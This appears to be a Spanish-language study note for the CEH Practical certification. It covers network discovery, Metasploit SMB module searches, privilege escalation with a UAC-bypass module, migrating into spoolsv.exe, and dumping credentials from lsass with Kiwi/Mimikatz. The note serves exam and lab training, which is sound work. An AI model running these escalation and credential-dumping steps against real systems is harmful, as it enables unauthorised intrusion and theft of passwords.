# CEH-Practical

## Reconnasiance/Footprinting

### netdiscover (ARP)

![image](https://user-images.githubusercontent.com/63270579/230136974-19ace88f-f73c-428c-bdf6-1bc2b4419637.png)

### Metasploit SMB

Para iniciar metasploit 

```
msfdb init && msfconsole
# En el caso de que no inicie pues ese pero siempre ejecuto nada mas este:
msfconsole
```
Buscar palabras claves 

```
search smb
```
Pero podemos llevar la busqueda a mas con un filtro como este que hice

![image](https://user-images.githubusercontent.com/63270579/230143806-39c278dc-e79c-4754-8a7f-67e9577b81a1.png)

Para encontrar que exploits se pueden usar para ***PRIV ESC***

```
run post/multi/recon/local_exploit_suggester
CTRL+z
set session 1 # Ve las opciones para que veas que pide que pongas una session
use exploit/windows/local/bypassuac_eventvwr
show options
set lhost
run
```

![image](https://user-images.githubusercontent.com/63270579/230158169-e12c02fd-68db-4d7b-a1ce-b77ae089575a.png)

Para ver los privilegios

```
getprivs
```

Para migrar a procesos que puedan manipilar el lsass

```
migrate -N spoolsv.exe

```
Para dumpear los passwords con  Mimikatz (Kiwi is the updated version of Mimikatz)
 ```
 load kiwi
 help
 cred_all
 ```
 
### Encontrar scripts nmap SMB

Vamos a buscarlos recordamos que los scripts tienen la extencion .nse

```
#Primero vemos si la base que usa locate esta actualizada

updatedb
locate *.nse
#Filtramos lo que nos interesa 
locate *.nse | grep "smb"

```


![image](https://user-images.githubusercontent.com/63270579/230146227-e6c3af45-1cea-46ee-9b30-0687eca73855.png)


## Windows  

### lsass

The lsass service, the service responsible for authentication within Windows.

### spoolsv.exe

The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?


















































































